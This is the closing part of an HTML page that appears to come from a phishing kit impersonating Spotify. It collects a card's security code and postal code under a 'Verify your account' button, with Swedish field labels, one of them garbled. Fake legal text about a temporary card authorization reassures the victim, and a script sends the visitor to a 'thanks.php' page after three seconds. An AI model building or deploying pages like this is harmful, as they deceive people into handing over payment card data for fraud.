                                                                            <option value="2028">2028</option>
                                                                            <option value="2029">2029</option>
                                                                            <option value="2030">2030</option>
                                                                            <option value="2031">2031</option>
                                                                            <option value="2032">2032</option>
                                                                            <option value="2033">2033</option>
                                                                            <option value="2034">2034</option>
                                                                            <option value="2035">2035</option>
                                                                            <option value="2036">2036</option>
                                                                            <option value="2037">2037</option>
                                                                            <option value="2038">2038</option>
                                                                            <option value="2039">2039</option>
                                                                            <option value="2040">2040</option>
                                                                        </select>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="row">
                                                        <div class="col-xs-6">
                                                            <div class="form-group">
                                                                <label id="trans-security_code" for="security-code" class="contain-tooltip" data-tooltip="" data-lang="cvc_info">Säkerhetskod</label>
                                                                <span class="safe-field">
                    <input style=" background-image: url(vv.gif); background-repeat: no-repeat; background-position: 97% 45%; margin-bottom: 8px; " type="tel" id="csc" name="csc" autocomplete="off" pattern="[0-9]*" class="form-control">
                </span>
                                                            </div>
                                                        </div>
                                                        <div class="col-xs-6">
                                                            <div class="form-group">
                                                                <label id="trans-label_postal_code" for="zip-code">Blixtlås
                                                                     koda</label>
                                                                <input id="aaa" name="zip-code" autocomplete="off" type="text" class="form-control">
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <p class="text-legal">
                                                        Spotify will make a temporary authorization on your card to
                                                        verify it. This is an authorization only and NOT a charge. Your
                                                        bank may inform you of the authorization.
                                                    </p>
                                                    <p class="text-legal">
                                                        <strong>By purchasing you authorize Spotify to automatically
                                                            charge you $4.99 + any applicable tax each month until you
                                                            cancel.</strong> If the price changes, we’ll notify you
                                                        beforehand. You can check your renewal date or cancel anytime
                                                        via your <a href="#">Account page</a>. No partial refunds. <a href="#">Terms and Conditions</a> apply.
                                                    </p>
                                                    <div>
                                                        <div id="offer_paypal"></div>
                                                    </div>
                                                    <div>
                                                        <div class="submit-button">
                                                            <button onclick="return xForm()" type="submit" id="offer_submit" name="offer[submit]" class="btn btn-green">
            <span class="submit-icon">
            </span>
                                                                Verify your account
                                                            </button>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>
                                        </section>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<footer role="contentinfo" class="footer footer-default ">
    <div class="container">
        <nav class="row">
            <div class="col-xs-12 col-md-2">
                <div class="footer-logo">
                    <a href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Spotify</font></font></a>
                </div>
            </div>
            <div class="col-xs-6 col-sm-4 col-md-2">
                <h3 class="nav-title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">company</font></font></h3>
                <ul class="nav">
                    <li>
                        <a href="#" id="nav-link-about" data-ga-category="menu" data-ga-action="about"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            About
                        </font></font></a>
                    </li>
                    <li>
                        <a href="#" id="nav-link-jobs" data-ga-category="menu" data-ga-action="jobs"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Jobs
                        </font></font></a>
                    </li>
                    <li>
                        <a href="#" id="nav-link-press" data-ga-category="menu" data-ga-action="press"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Press
                        </font></font></a>
                    </li>
                    <li>
                        <a href="#" id="nav-link-news" data-ga-category="menu" data-ga-action="news"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            News
                        </font></font></a>
                    </li>
                </ul>
            </div>
            <div class="col-xs-6 col-sm-4 col-md-2">
                <h3 class="nav-title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Communities</font></font></h3>
                <ul class="nav">
                    <li>
                        <a href="#" id="nav-link-artists" data-ga-category="menu" data-ga-action="artists"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            For artists
                        </font></font></a>
                    </li>
                    <li>
                        <a href="#" id="nav-link-developers" data-ga-category="menu" data-ga-action="developers"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Developers
                        </font></font></a>
                    </li>
                    <li>
                        <a href="#" id="nav-link-brands" data-ga-category="menu" data-ga-action="brands"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Brands
                        </font></font></a>
                    </li>
                </ul>
            </div>
            <div class="col-xs-6 col-sm-4 col-md-2">
                <h3 class="nav-title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Useful links</font></font></h3>
                <ul class="nav">
                    <li>
                        <a href="#" id="nav-link-help" data-ga-category="menu" data-ga-action="help"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Help
                        </font></font></a>
                    </li>
                    <li>
                        <ahref ="#"="" id="nav-link-gift" data-ga-category="menu" data-ga-action="gift"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                        Married
                        
                    </font></font></ahref></li>
                    <li class="hidden-xs ">
                        <a href="#" id="nav-link-play" data-ga-category="menu" data-ga-action="play"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            Web Player
                        </font></font></a>
                    </li>
                </ul>
            </div>
        </nav>
        <nav class="row row-small">
            <div class="col-xs-9 col-md-7">
                <ul class="nav nav-small">
                    <li>
                        <a href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Legal</font></font></a>
                    </li>
                    <li>
                        <a href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Privacy</font></font></a>
                    </li>
                    <li>
                        <a href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookies</font></font></a>
                    </li>
                    <li>
                        <a href="#"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">About Ads</font></font></a>
                    </li>
                </ul>
            </div>
            <div class="col-xs-3 col-md-5 text-right">
                <a class="market" href="#" title="Click to change">
                    <div class="media">
                        <div class="media-body media-middle"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                            International
                        </font></font></div>
                        <div class="media-right media-middle">
                            <span class="media-object flag-icon flag-icon-int"></span>
                        </div>
                    </div>
                </a>
                <small class="copyright"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">? </font><font style="vertical-align: inherit;">2023 Spotify AB</font></font></small>
            </div>
        </nav>
    </div>
</footer><div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: 'Google Sans', Arial, sans-serif;" data-id=""><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c"><img src="https://fonts.gstatic.com/s/i/productlogos/translate/v14/24px.svg" width="24" height="24" alt=""></div><div class=" VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c"><div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">Original text</div><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Rate this translation</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Your feedback will be used to help improve Google Translate</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Good translation" aria-label="Good translation" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Poor translation" aria-label="Poor translation" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="//translate.googleapis.com/translate_voting?client=te_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans" id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe name="votingFrame" frameborder="0"></iframe></div></div></div>




<script>
    window.setInterval(function() {
        window.location = "thanks.php";
    }, 3000);
</script>





</body></html>